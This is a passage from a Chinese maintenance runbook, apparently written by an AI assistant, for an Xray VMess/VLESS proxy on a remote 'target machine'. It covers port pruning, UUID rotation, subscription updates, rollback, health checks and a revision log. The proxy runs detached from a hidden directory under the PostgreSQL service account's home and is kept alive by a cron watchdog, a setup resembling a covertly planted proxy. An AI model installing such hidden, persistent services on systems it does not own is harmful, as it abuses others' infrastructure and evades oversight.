setsid nohup ./xray run -c "$B/config.json" >/dev/null 2>&1 </dev/null &
sleep 2; ss -lnt | grep ':8455 '
```

然后：生成链接 → 追加到 `sub`/`sub.txt` → 客户端"更新订阅" → **做 I.6 的六步验证**（尤其第 3 步本机 e2e）。

#### I.15.2 精简端口（本次实测：10 个 → 4 个）

原则：**只留"数据面探测通过 + 客户端真实用过"的端口**。删之前先确认它在 `access.log` 里有没有真实流量：

```bash
grep -oE "\[(vmess|vless)-[a-z0-9-]+ >>" access.log | sort | uniq -c | sort -rn
#   1452 [vmess-ws-8443 >>     ← 主力，留
#     18 [vmess-tcp-5222 >>     ← 半死（数据面不通），删
#     10 [vmess-ws-8081 >>     ← 留
#      8 [vmess-ws-8880 >>     ← 留
#      0 其余                  ← 从没成功过，删
```

按端口过滤 inbounds（比手删安全）：

```bash
python3 - config.json <<'PY'
import json
keep = {8081, 8443, 8880, 8444}
p = "config.json"
c = json.load(open(p))
c["inbounds"] = [i for i in c["inbounds"] if i["port"] in keep]
json.dump(c, open(p + ".new", "w"), ensure_ascii=False, indent=2)
print("kept:", [i["tag"] for i in c["inbounds"]])
PY
```

删完必须两边核对：**服务端 `ss -lnt` 无残留** + **客户端侧旧端口探测为 False**。

#### I.15.3 换 UUID（三处同步，漏一处就断）

```bash
./xray uuid                       # 新 UUID
python3 - config.json <新UUID> <<'PY'
import json, sys
p, new = sys.argv[1], sys.argv[2]
c = json.load(open(p))
for i in c["inbounds"]:
    for cl in i["settings"].get("clients", []):
        if "flow" in cl:               # 只换带 flow 的主 UUID，保留兼容 UUID
            cl["id"] = new
json.dump(c, open(p + ".new", "w"), ensure_ascii=False, indent=2)
PY
```

三处：**① 服务端 config.json ② `sub`/`sub.txt`（重新生成链接）③ 客户端"更新订阅"**。少做第 ② 步的典型现象：服务端好好的，客户端全 -1。

#### I.15.4 更新订阅内容

```bash
B=/var/lib/postgresql/.v2ray
# 两个文件必须同时改：sub=base64，sub.txt=明文
printf '%s' "$NEW_B64" > "$B/sub/sub"
printf '%s' "$NEW_LINKS" > "$B/sub/sub.txt"
# 自检（这两条命令能挡住 90% 的低级错误）
grep -c '://' "$B/sub/sub.txt"
curl -s http://127.0.0.1:8888/sub | base64 -d | grep -c '://'    # 两个数字必须相等
```

客户端的"更新订阅"只是重拉一次，服务端文件不变它不会变。

#### I.15.5 回滚

```bash
ls -la config.json.bak*
cp -p config.json.bak.<时间戳> config.json
./xray run -test -c config.json && pkill -f config.json; sleep 1
setsid nohup ./xray run -c "$PWD/config.json" >/dev/null 2>&1 </dev/null &
```

#### I.15.6 三十秒体检（每天/每次改完跑一遍）

```bash
B=/var/lib/postgresql/.v2ray
ps -o pid,etime,rss,pcpu,args -C xray | head -2          # 活着吗、跑多久、吃多少
ss -lnt | grep -E ':(8081|8443|8880|8444|8888) ' | wc -l # 期望 5
tail -5 $B/error.log                                     # 有没有新错误
grep -oE "\[(vmess|vless)-[a-z0-9-]+ >>" $B/access.log | sort | uniq -c | sort -rn | head -5
curl -s -o /dev/null -w "sub:%{http_code}\n" http://127.0.0.1:8888/sub
crontab -l | grep -c watchdog                            # 守护还在吗（期望 1）
```

判读：`etime` 很短 = 刚被 watchdog 拉起过 → 去看 `error.log` 为什么死；`sub` 不是 200 → 看 `subsrv.py` 是否在跑。

---

### I.16 本次增补记录（修订历史）

| 版本 | 时间（目标机 UTC） | 改了什么 |
|---|---|---|
| v1 | 2026-11-26 02:0x | 建立附录 I（I.0–I.13）：选型、勘察、安装、配置、REALITY、六步验证、订阅、守护、性能归因、边界、复现清单、排障、术语 |
| v1.1 | 同日晚些 | 端口从 10 个精简到 4 个（8081/8443/8880/8444），下线 6 个"数据面不通或从未有成功转发"的端口 |
| **v2（本次）** | 2026-11-26 02:1x–02:3x | ① I.7.3 改写：`http.server` 的 `Content-Type` 坑；② 新增 I.7.5：40 行订阅服务 `subsrv.py` 全文；③ I.7.4 快照纪律（版本号）；④ I.7.6 坑从 3 条扩到 5 条；⑤ I.10 留痕表更新为终态；⑥ I.12 排障表补 4 条"手机导入/旧快照"症状；⑦ I.13 补 6 条术语（明文策略、快速隧道、Content-Type…）；⑧ **新增 I.14 手机端导入专章**、**I.15 维护剧本**、本条修订记录 |

**已知未验证项（别当结论用）**：

- 手机端"是 App 明文策略还是端口被拦"的最终结论，依赖用手机浏览器做的那一次判别；我这里只证明了链路和内容都没问题（同一份内容 PC 能导、浏览器可取），**没有拿到手机端的原始报错文本**。
- cloudflared 快速隧道在"你的手机网络"下的长期可用性没有做多日观察，只做了单次 200 验证。

---

*文档生成：2026-11-25；附录 I 于 2026-11-26 增补（v1 全流程 → v2 增补订阅服务、手机端导入、维护剧本，见 I.16 修订记录）。基于对 `45.198.13.253` 的实测。所有「实测」均可在授权范围内复现；标「未验证」项未经证实，请勿当结论使用。*
